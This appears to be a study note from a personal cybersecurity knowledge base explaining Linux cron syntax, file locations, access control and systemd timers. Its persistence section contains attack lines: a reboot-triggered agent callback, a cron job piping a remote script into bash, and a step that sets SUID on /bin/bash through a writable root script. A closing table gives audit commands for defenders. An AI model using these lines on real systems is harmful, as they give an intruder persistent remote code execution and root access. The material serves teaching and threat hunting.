<!-- =========================================================================
   PROJECT: IW Cyber Ops — Knowledge Base (Intelligence Vault)
   AUTHOR: Muhammad Imran | IW Cyber Ops (@iwcyberops)
   TRACK: 42-Month Systems & Cyber Operations Research
   MODULE: Month 01 — Linux Kernel Interface & Core CLI
   DOCUMENT: Day 13 — Task Automation, Cron Internals & Persistence Vectors
   ========================================================================= -->

# 🛡️ Day 13: Task Automation, Cron Internals & Persistence Vectors

> **IW Cyber Ops Research Vault | Module 01: Linux & Systems Foundations**  
> *Author: Muhammad Imran (@iwcyberops)*  
> *Track: Automation Daemons, Time-Based Execution, Schedulers & Threat Surface Analysis*

---

## 1. Task Scheduling Subsystems Architecture

Linux provides three primary mechanisms for background automated execution: the traditional **Cron Daemon (`cron` / `crond`)**, the offline-friendly **Anacron**, and modern **Systemd Timers**.

```
                           ┌──────────────────────────────────────────────┐
                           │          LINUX TASK SCHEDULERS               │
                           └──────────────────────┬───────────────────────┘
                                                  │
                 ┌────────────────────────────────┼──────────────────────────────┐
                 ▼                                ▼                              ▼
       ┌──────────────────┐             ┌──────────────────┐           ┌──────────────────┐
       │      cron        │             │     anacron      │           │  systemd timers  │
       ├──────────────────┤             ├──────────────────┤           ├──────────────────┤
       │ 24/7 Running     │             │ Laptops/Desktops │           │ Modern Init      │
       │ Systems/Servers  │             │ Catches missed   │           │ Granular logging │
       │ Minute precision │             │ jobs on boot     │           │ via journalctl   │
       └──────────────────┘             └──────────────────┘           └──────────────────┘
```

---

## 2. Crontab Syntax & Timing Engine

The scheduling engine parses a **5-field time structure** followed by the target command (or 6 fields in system-wide configurations which include the executing username).

```
 ┌───────────── Minute (0 - 59)
 │ ┌────────────── Hour (0 - 23, 24-hour format)
 │ │ ┌─────────────── Day of the Month (1 - 31)
 │ │ │ ┌──────────────── Month of the Year (1 - 12 or JAN - DEC)
 │ │ │ │ ┌───────────────── Day of the Week (0 - 6, where 0/7 = Sunday)
 │ │ │ │ │
 * * * * *  /path/to/executable_or_script.sh
```

### Time Parameter Syntax Operators

| Operator | Meaning | Example | Execution Schedule |
| :---: | :--- | :--- | :--- |
| `*` | **Every / Wildcard** | `* * * * *` | Every single minute |
| `,` | **Value List** | `0,15,30,45 * * * *` | At minutes 0, 15, 30, and 45 of every hour |
| `-` | **Value Range** | `0 9-17 * * 1-5` | Every hour on the hour from 9 AM to 5 PM (Mon–Fri) |
| `/` | **Step / Interval** | `*/10 * * * *` | Every 10 minutes |

---

### Standard Crontab Timing Macros

| Macro String | Equivalent Expression | Operational Meaning |
| :--- | :--- | :--- |
| `@reboot` | *(Kernel Boot Hook)* | Runs once immediately upon system initialization |
| `@hourly` | `0 * * * *` | Runs at the start of every hour |
| `@daily` / `@midnight` | `0 0 * * *` | Runs once every day at 00:00 (Midnight) |
| `@weekly` | `0 0 * * 0` | Runs every Sunday at 00:00 |
| `@monthly` | `0 0 1 * *` | Runs on the 1st of every month at 00:00 |

---

## 3. Filesystem Layout: User vs System-Wide Cron

Cron locations are partitioned based on privilege domains across the filesystem:

```
/etc/
├── crontab                 --> Core system-wide schedule (specifies user explicitly)
├── cron.d/                 --> Modular system drop-in crontabs (daemons/packages)
├── cron.hourly/            --> Executable scripts run every 60 minutes
├── cron.daily/             --> Executable scripts run once per day
├── cron.weekly/            --> Executable scripts run once per week
└── cron.monthly/           --> Executable scripts run once per month

/var/spool/cron/crontabs/   --> Per-user individual crontabs (restricted permissions)
```

### Critical File Breakdown:

1. **User Spool (`/var/spool/cron/crontabs/<username>`):**  
   Managed solely via the `crontab` binary. Permissions are restricted (`0600` or `1600`) so users cannot view each other's schedules.
2. **System Table (`/etc/crontab`):**  
   Managed by administrators. Includes a mandatory **User Field**:
   ```text
   # m  h  dom mon dow  user   command
     0  3   *   *   *   root   /usr/local/bin/backup.sh >/dev/null 2>&1
   ```
3. **Drop-in Packages (`/etc/cron.d/`):**  
   Installed by background services (e.g., `certbot`, `sysstat`). Follows the identical format as `/etc/crontab`.

---

## 4. Operational Management & Access Control

### 1. Crontab Management Utility
* `crontab -e` — Edit the active user's crontab safely (uses `$VISUAL` or `$EDITOR` with syntax checking).
* `crontab -l` — Display current user's active crontab configuration.
* `crontab -r` — Remove/delete the current user's entire crontab table.
* `sudo crontab -u operator -l` — List crontab belonging to a specific target user.
* `sudo crontab -u root -e` — Edit the root user's personal crontab.

---

### 2. User Access Control Policies
Administrators restrict scheduling capabilities through two control lists:

* `/etc/cron.allow` — If this file exists, **only** users listed inside are permitted to use `crontab`.
* `/etc/cron.deny` — If `cron.allow` does not exist, users listed here are blocked from scheduling tasks.
* If neither file exists, distribution defaults dictate access (often allowing all users or only root).

---

## 5. Threat Operations & Persistence Tradecraft

In cyber operations and post-exploitation research, cron jobs represent a primary mechanism for **Persistence**, **Periodic Beacons (Callback Channels)**, and **Local Privilege Escalation (PrivEsc)**.

```
┌────────────────────────────────────────────────────────────────────────┐
│                   CRON THREAT SURFACE & ATTACK VECTORS                 │
├──────────────────────────┬─────────────────────────────────────────────┤
│ 1. Periodic C2 Beacons   │ Scheduled telemetry callbacks to operator   │
│ 2. World-Writable Tasks  │ Hijacking scripts executed by high-priv IDs │
│ 3. Relative Path Abuse   │ Hijacking execution via missing PATH context│
│ 4. Wildcard Expansion    │ Parameter injection into command arguments  │
└──────────────────────────┴─────────────────────────────────────────────┘
```

---

### Vector 1: Periodic Callbacks & Automated Staging
Adversaries use time-delayed tasks to maintain access even if an active session is disconnected or the server reboots.

* **Reboot Persistence:**
  ```bash
  @reboot /home/user/.local/bin/agent --connect 192.0.2.10:443 >/dev/null 2>&1
  ```
* **Interval Beaconing:** Executing periodic telemetry checks every 30 minutes to verify connectivity and sync instructions:
  ```bash
  */30 * * * * curl -s http://internal-ops.local/telemetry.txt | bash
  ```

---

### Vector 2: Privilege Escalation via Insecure File Permissions
If a cron job running under the `root` context executes an external script that has lax write permissions, an unprivileged user can modify the script to execute elevated commands.

```bash
# Scenario: Root crontab contains:
# */5 * * * * root /opt/maintenance/cleanup.sh

# Operator checks file permissions:
ls -la /opt/maintenance/cleanup.sh
# Output: -rwxrwxrwx 1 root root 220 Aug 10 12:00 /opt/maintenance/cleanup.sh

# Exploit Action: Unprivileged user appends command to file:
echo "chmod +s /bin/bash" >> /opt/maintenance/cleanup.sh

# Result: Within 5 minutes, root executes the script and enables SUID on /bin/bash.
```

---

### Vector 3: The Restricted Path Environment Trap
The environment inside a cron execution context is stripped down compared to an interactive shell session.

* Default `PATH` in cron is often limited to: `PATH=/usr/bin:/bin`.
* If a scheduled script executes a binary using relative paths (e.g., `backup` instead of `/usr/bin/backup`), an attacker with write access to an early directory in `$PATH` can place a rogue binary to hijack execution.

---

## 6. Modern Alternative: Systemd Timers

Modern Linux distributions increasingly use **Systemd Timers** instead of cron because they provide unified logging via `journalctl`, service dependency tracking, and sub-minute execution accuracy.

A systemd timer requires two files in `/etc/systemd/system/`:
1. `task.service` — The unit that specifies **what** to execute.
2. `task.timer` — The unit that specifies **when** to execute.

```ini
# /etc/systemd/system/iw_recon.timer
[Unit]
Description=IW Cyber Ops Automated Audit Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=1h
Unit=iw_recon.service

[Install]
WantedBy=timers.target
```

```bash
# Systemd Timer Management:
sudo systemctl daemon-reload
sudo systemctl enable --now iw_recon.timer
systemctl list-timers                  # View all active system timers and next trigger events
```

---

## 7. Defensive Threat Hunting & Auditing Matrix

| Security / Audit Objective | Operational Command | Analysis Focus |
| :--- | :--- | :--- |
| **Audit All User Crontabs** | `for u in $(cut -f1 -d: /etc/passwd); do sudo crontab -u $u -l 2>/dev/null; done` | Identifies hidden unprivileged schedules |
| **Audit System Cron Directories** | `ls -la /etc/cron* /etc/crontab /etc/cron.d/` | Inspects system-level scheduled jobs |
| **Hunt Writable Scheduled Scripts** | `find /etc/cron* /var/spool/cron -type f -perm -0002` | Discovers privilege escalation vulnerabilities |
| **Inspect Live Cron Execution Logs**| `grep CRON /var/log/syslog \| tail -n 25` *(or `journalctl -u cron`)* | Detects anomalous command invocations |
| **Audit Active Systemd Timers** | `systemctl list-timers --all` | Identifies hidden modern persistence hooks |

---

<!-- =========================================================================
   [IW CYBER OPS] - INTERNAL RESEARCH USE ONLY
   Repository: https://github.com/iwcyberops/IW-Knowledge-Base
   ========================================================================= -->
